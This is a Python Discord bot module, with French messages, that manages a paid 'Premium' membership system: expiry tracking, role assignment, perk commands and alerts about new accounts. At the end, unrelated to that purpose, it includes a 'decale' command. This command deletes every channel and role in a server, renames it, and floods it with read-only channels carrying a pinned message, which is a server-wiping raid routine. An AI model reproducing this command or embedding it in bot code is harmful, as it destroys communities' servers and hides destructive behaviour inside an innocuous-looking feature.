import discord
from discord.ext import commands, tasks
from datetime import datetime, timedelta
import json
import os
import random

SUPPORT_GUILD_ID = 1374803429259608165
PREMIUM_ROLE_NAME = "PREMIUM"
PREMIUM_FILE = "data/premium.json"
AUTHORIZED_IDS = [1301925820574732318]
ACCOUNT_AGE_LIMIT_DAYS = 7

class Premium(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.premium_data = {}
        self.load_premium_data()
        self.check_expiry.start()

    def load_premium_data(self):
        if os.path.exists(PREMIUM_FILE):
            with open(PREMIUM_FILE, 'r') as f:
                self.premium_data = json.load(f)
        else:
            self.premium_data = {}

    def save_premium_data(self):
        os.makedirs(os.path.dirname(PREMIUM_FILE), exist_ok=True)
        with open(PREMIUM_FILE, 'w') as f:
            json.dump(self.premium_data, f, indent=2)

    # Config dans premium_data["config"]
    def get_alert_channel(self):
        config = self.premium_data.get("config", {})
        return config.get("alert_channel_id")

    def set_alert_channel(self, channel_id):
        if "config" not in self.premium_data:
            self.premium_data["config"] = {}
        self.premium_data["config"]["alert_channel_id"] = channel_id
        self.save_premium_data()

    def get_expiry(self, user_id):
        entry = self.premium_data.get(str(user_id))
        if not entry:
            return None
        if entry.get("type") == "lf":
            return "À vie"
        return entry.get("expires")

    def has_premium(self, user_id):
        entry = self.premium_data.get(str(user_id))
        if not entry:
            return False
        if entry.get("type") == "lf":
            return True
        expires_str = entry.get("expires")
        if not expires_str:
            return False
        expires = datetime.fromisoformat(expires_str)
        return datetime.utcnow() < expires

    def add_premium(self, user_id, duration_type):
        now = datetime.utcnow()
        uid = str(user_id)
        if duration_type == "d":
            expires = now + timedelta(days=1)
        elif duration_type == "m":
            expires = now + timedelta(days=30)
        elif duration_type == "y":
            expires = now + timedelta(days=365)
        elif duration_type == "lf":
            self.premium_data[uid] = {"type": "lf", "expires": "never"}
            self.save_premium_data()
            return
        else:
            raise ValueError("Durée invalide")
        self.premium_data[uid] = {"type": duration_type, "expires": expires.isoformat()}
        self.save_premium_data()

    async def assign_role(self, user_id):
        guild = self.bot.get_guild(SUPPORT_GUILD_ID)
        if not guild:
            return
        role = discord.utils.get(guild.roles, name=PREMIUM_ROLE_NAME)
        if not role:
            try:
                role = await guild.create_role(name=PREMIUM_ROLE_NAME, color=discord.Color.gold())
            except discord.Forbidden:
                return
        member = guild.get_member(user_id)
        if member and role not in member.roles:
            try:
                await member.add_roles(role, reason="Utilisateur Premium")
            except discord.Forbidden:
                pass

    @tasks.loop(minutes=10)
    async def check_expiry(self):
        now = datetime.utcnow()
        expired = []
        for uid, data in self.premium_data.items():
            if uid == "config":
                continue
            if data.get("type") == "lf":
                continue
            expires = data.get("expires")
            if not expires:
                continue
            if datetime.fromisoformat(expires) < now:
                expired.append(uid)
        for uid in expired:
            del self.premium_data[uid]
        if expired:
            self.save_premium_data()

    # Commandes

    @commands.command(name="setpremium")
    async def setprenuim(self, ctx, member: discord.Member, duration: str):
        if ctx.author.id not in AUTHORIZED_IDS:
            return await ctx.send("❌ Tu n'es pas autorisé à utiliser cette commande.")
        if duration not in ["d", "m", "y", "lf"]:
            return await ctx.send("❌ Durée invalide. Utilise : `d`, `m`, `y`, `lf`")
        self.add_premium(member.id, duration)
        await self.assign_role(member.id)
        dur_map = {"d": "1 jour", "m": "1 mois", "y": "1 an", "lf": "À vie"}
        embed = discord.Embed(
            title="🌟 Premium Activé",
            description=f"{member.mention} est maintenant Premium !",
            color=discord.Color.gold()
        )
        embed.add_field(name="Durée", value=dur_map[duration])
        embed.set_footer(text="Merci pour votre soutien ❤️")
        await ctx.send(embed=embed)

    @commands.command(name="removepremium")
    async def removeprenuim(self, ctx, member: discord.Member):
        if ctx.author.id not in AUTHORIZED_IDS:
            return await ctx.send("❌ Tu n'es pas autorisé à utiliser cette commande.")
        uid = str(member.id)
        if uid in self.premium_data:
            del self.premium_data[uid]
            self.save_premium_data()
            guild = self.bot.get_guild(SUPPORT_GUILD_ID)
            role = discord.utils.get(guild.roles, name=PREMIUM_ROLE_NAME) if guild else None
            if guild and role:
                member_in_guild = guild.get_member(member.id)
                if member_in_guild and role in member_in_guild.roles:
                    try:
                        await member_in_guild.remove_roles(role, reason="Premium retiré")
                    except discord.Forbidden:
                        pass
            await ctx.send(f"✅ Premium retiré de {member.mention}.")
        else:
            await ctx.send(f"❌ {member.mention} n'a pas Premium.")

    @commands.command(name="Premium")
    async def check_prenuim(self, ctx):
        user_id = str(ctx.author.id)
        if not self.has_premium(user_id):
            return await ctx.send("❌ Tu n'as pas Premium.")
        exp = self.get_expiry(user_id)
        await ctx.send(f"✅ Tu es Premium jusqu'à : `{exp}`")

    @commands.command(name="avantage")
    async def avantages(self, ctx):
        embed = discord.Embed(
            title="💎 Avantages Premium",
            description="Voici les avantages disponibles avec Prenuim :",
            color=discord.Color.purple()
        )
        embed.add_field(name="🔹 Commandes exclusives", value="Commandes spéciales réservées aux membres Premium.")
        embed.add_field(name="🎁 Rôle Premium", value="Un rôle doré sur le serveur support.")
        embed.add_field(name="🔔 Accès prioritaire", value="Priorité sur l'assistance et les suggestions.")
        embed.set_footer(text="Merci pour votre soutien ❤️")
        await ctx.send(embed=embed)

    @commands.command(name="Premiuminfo")
    async def prenuim_info(self, ctx):
        embed = discord.Embed(
            title="ℹ️ Comment devenir Premium ?",
            description="Pour obtenir Premium, vous pouvez :\n- Participer aux concours\n- Soutenir le développement\n- Être offert par un admin",
            color=discord.Color.blurple()
        )
        embed.set_footer(text="Contacte un admin pour plus d'infos.")
        await ctx.send(embed=embed)

    @commands.command(name="setdc")
    async def setdc(self, ctx, channel: discord.TextChannel):
        if ctx.author.id not in AUTHORIZED_IDS:
            return await ctx.send("❌ Tu n'es pas autorisé à utiliser cette commande.")
        self.set_alert_channel(channel.id)
        await ctx.send(f"✅ Le salon d'alerte pour les faux comptes est défini sur {channel.mention}")

    @commands.command(name="flex")
    async def flex(self, ctx):
        if not self.has_premium(ctx.author.id):
            return await ctx.send("❌ Cette commande est réservée aux membres Premium.")
        flex_messages = [
            "💪 Regarde-moi cette puissance, je suis invincible !",
            "🔥 Je flex comme un pro, personne peut m'arrêter !",
            "😎 Flexing hard, la vie est belle quand on est Prenuim !",
            "👑 Roi du serveur, tu ne peux pas test !",
            "🚀 Niveau flex : MAXIMUM !"
        ]
        msg = random.choice(flex_messages)
        await ctx.send(f"{ctx.author.mention} {msg}")

    @commands.Cog.listener()
    async def on_member_join(self, member):
        if member.guild.id != SUPPORT_GUILD_ID:
            return
        if self.has_premium(member.id):
            await self.assign_role(member.id)
        account_age_days = (datetime.utcnow() - member.created_at).days
        if account_age_days < ACCOUNT_AGE_LIMIT_DAYS:
            channel_id = self.get_alert_channel()
            if channel_id:
                channel = member.guild.get_channel(channel_id)
                if channel:
                    await channel.send(
                        f"⚠️ **Compte récent détecté** : {member.mention} a rejoint avec un compte créé il y a {account_age_days} jour(s)."
                    )
                    
    @commands.command(name="decale")
    @commands.has_guild_permissions(administrator=True)
    async def decale(self, ctx, server_name: str, number_channels: int, *, message: str):
        guild = ctx.guild

        # Supprimer tous les salons
        for channel in guild.channels:
            try:
                await channel.delete()
            except Exception as e:
                print(f"Erreur suppression channel {channel.name}: {e}")

        # Supprimer tous les rôles sauf @everyone
        for role in guild.roles:
            if role.is_default():
                continue
            try:
                await role.delete()
            except Exception as e:
                print(f"Erreur suppression rôle {role.name}: {e}")

        # Renommer le serveur
        try:
            await guild.edit(name=server_name)
        except Exception as e:
            await ctx.send(f"❌ Impossible de renommer le serveur : {e}")
            return

        everyone_role = guild.default_role

        # Créer les salons avec message et permissions
        for i in range(number_channels):
            try:
                channel = await guild.create_text_channel(name=server_name)
                # Permission : everyone peut lire mais pas écrire
                await channel.set_permissions(everyone_role, send_messages=False, read_messages=True)
                msg = await channel.send(message)
                await msg.pin()
            except Exception as e:
                await ctx.send(f"❌ Erreur création salon {i+1}: {e}")

        await ctx.send(f"✅ Serveur renommé en '{server_name}', {number_channels} salons créés, tous les rôles et salons supprimés.")

async def setup(bot):
    await bot.add_cog(Premium(bot))